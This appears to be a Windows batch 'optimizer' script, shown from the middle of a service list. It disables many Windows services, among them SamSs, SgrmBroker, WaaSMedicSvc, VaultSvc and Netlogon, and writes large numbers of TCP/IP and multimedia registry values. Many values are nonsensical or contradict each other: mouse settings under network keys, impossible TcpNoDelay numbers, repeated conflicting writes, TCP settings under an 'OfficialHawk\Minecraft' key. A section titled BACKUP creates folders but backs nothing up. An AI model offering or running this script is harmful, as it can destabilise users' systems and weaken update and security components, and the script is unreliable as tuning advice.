reg add "HKLM\SYSTEM\CurrentControlSet\Services\LSM" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LxpSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MapsBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MessagingService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\mpssvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSDTC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MSiSCSI" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\msiserver" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NaturalAuthentication" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcaSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcbService" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NcdAutoSetup" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netman" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\netprofm" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetSetupSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetTcpPortSharing" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NgcCtnrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NgcSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\nsi" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\p2pimsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\p2psvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PcaSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PeerDistSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PerfHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PhoneSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\pla" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PlugPlay" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PNRPAutoReg" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PNRPsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PolicyAgent" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Power" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PrintWorkflowUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ProfSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PushToInstall" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\QWAVE" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasAuto" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RasMan" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RemoteAccess" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RmSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RpcSs" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SamSs" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SCardSvr" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ScDeviceEnum" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Schedule" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SCPolicySvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SDRSVC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\seclogon" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SEMgrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SENS" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensorDataService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensorService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SensrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SessionEnv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SgrmBroker" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ShellHWDetection" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\shpamsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\smphost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SmsRouter" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SNMPTRAP" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\sppsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SSDPSRV" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ssh-agent" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SstpSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StateRepository" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\stisvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\StorSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\svsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\swprv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SystemEventsBroker" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TapiSrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Themes" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TieringEngineService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TokenBroker" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrkWks" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TroubleshootingSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrustedInstaller" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\tzautoupdate" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UdkUserSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UevAgentService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UnistoreSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\upnphost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UserDataSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UserManager" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UsoSvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VaultSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vds" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VSS" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WalletService" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WarpJITSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wbengine" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WbioSrvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Wcmsvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wcncsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WebClient" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Wecsvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WEPHOSTSVC" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wercplsupport" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WerSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WFDSConMgrSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WiaRpc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Winmgmt" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinRM" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WlanSvc" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wlidsvc" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wlpasvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WManSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wmiApSrv" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WpcMonSvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WPDBusEnum" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WSearch" /v "Start" /t REG_DWORD /d "2" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v "Start" /t REG_DWORD /d "3" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WwanSvc" /v "Start" /t REG_DWORD /d "4" /f


:LL
ECHO OFF
cls
title BACKUP
@echo off
Set HEARTHEARTREALREALREAL=5TguKCrE
Set HEARTHEARTREALHEARTREAL=vbFJm8sU
Set REALHEARTREALHEARTHEART=jIOShozq
Set HEARTREALHEARTHEARTHEART=kRy9WPf1
Set REALREALREALREALREAL=Xle46cLY
Set HEARTHEARTHEARTREALREAL=dN3VMipB
Set REALREALHEARTHEARTHEART=AaQ70wD
Set REALREALREALHEARTREAL=GZHxn2t
cls
mkdir \Backup 
chdir \Backup 
mkdir Backup 
chdir Backup 
mkdir Backup 
cd C:\Backup\Backup\Backup
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpDelAckTicks" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MouseSpeed" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MouseThreshold1" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MouseThreshold2" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "AutoRepeatDelay" /t REG_SZ /d "200" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "AutoRepeatRate" /t REG_SZ /d "15" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "BounceTime" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "DelayBeforeAcceptance" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Flags" /t REG_SZ /d "59" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last BounceKey Setting" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Repeat" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Accessibility\Keyboard Response" /v "Last Valid Wait" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "19435519" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "19435519" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1616" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "1616" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "3539039" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MTU" /t REG_DWORD /d "1500" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MSS" /t REG_DWORD /d "1460" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "415028" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "4096" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultReceiveWindow" /t REG_DWORD /d "3539039" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\AFD\Parameters" /v "DefaultSendWindow" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "372300" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "32767" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IRPStackSize" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "95268" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.9.4" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\Users\Owner\AppData\Roaming\.minecraft\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxFreeTcbs" /t REG_DWORD /d "415030" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxUserPort" /t REG_DWORD /d "415028" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "95520" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultRCVWindow" /t REG_DWORD /d "94258" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPerServer" /t REG_DWORD /d "22" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "22" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Version" /t REG_SZ /d "1.9.4" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Path" /t REG_SZ /d "C:\Users\Owner\AppData\Roaming\.minecraft\\" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "Tcp1323Opts" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxFreeTcbs" /t REG_DWORD /d "415030" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxUserPort" /t REG_DWORD /d "415028" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultTTL" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "415029" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "TCPDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "DefaultRCVWindow" /t REG_DWORD /d "94258" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPerServer" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\OfficialHawk\Minecraft" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNoDelay" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DnsPriority" /t REG_DWORD /d "1469" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "HostsPriority" /t REG_DWORD /d "572" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "LocalPriority" /t REG_DWORD /d "91" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "NetbtPriority" /t REG_DWORD /d "45" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "QualifyingDestinationThreshold" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IPEnableRouter" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveTime" /t REG_DWORD /d "7200000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "1000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
